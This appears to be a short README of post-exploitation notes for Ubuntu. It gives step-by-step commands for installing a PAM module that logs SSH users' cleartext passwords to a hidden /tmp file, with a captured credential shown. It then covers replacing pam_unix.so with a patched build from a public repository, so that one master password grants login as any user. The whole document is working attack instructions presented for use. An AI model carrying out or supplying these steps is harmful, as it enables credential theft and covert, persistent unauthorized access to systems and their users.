
Tested on:
- Linux WORK-ubuntu-dev 6.11.0-21-generic #21~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Feb 24 16:52:15 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
- PAM 1.5.3

---

# Installing PAM clear text password logger

Useful for collection and possible password reuse checks against other assets if cracking /etc/shadow is not an option :)

```bash
sudo apt install gcc -y
sudo apt-get install libpam0g-dev -y
```

```bash
gcc -fPIC -c pam_logger.c
gcc -shared -o pam_logger.so pam_logger.o -lpam
sudo mv pam_logger.so /lib/x86_64-linux-gnu/security/
sudo nano /etc/pam.d/sshd
auth       optional     pam_logger.so

sudo systemctl restart ssh

-> ssh localuser@10.6.11.99
password

localuser@WORK-ubuntu-dev:~$ sudo cat /tmp/.service_temp_data
[2025-04-09 18:09:34] User: 'localuser' Password: 'password'
```

---

# Installing PAM backdoor

```bash
sudo apt install -y autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc -y

sudo apt-get install docbook-xsl docbook-xml xsltproc xmlto git -y

git clone https://github.com/segmentati0nf4ult/linux-pam-backdoor.git

cd linux-pam-backdoor

# I was a bit lazy to fix compilation errors in an initial script so follow these instructions instead:

./backdoor.sh -v $(dpkg -l | grep libpam-mod | awk -F " " '{print $3}' | awk -F "-" '{print $1}' | sort -u) -p backdoor

cd linux-pam-1.5.3/

make distclean
./autogen.sh
./configure --disable-doc
make

cd ../

./backdoor.sh -v $(dpkg -l | grep libpam-mod | awk -F " " '{print $3}' | awk -F "-" '{print $1}' | sort -u) -p backdoor

sudo su

cp pam_unix.so /lib/x86_64-linux-gnu/security/

systemctl daemon-reload
systemctl restart ssh

```

Now using `ssh localuser@10.6.15.4` with the password `backdoor` will grant you access for any user. (If doesn't work for `root` user, make sure `PermitRootLogin` is set to `yes` in `/etc/ssh/sshd_config`


# Credits

- https://github.com/segmentati0nf4ult/linux-pam-backdoor


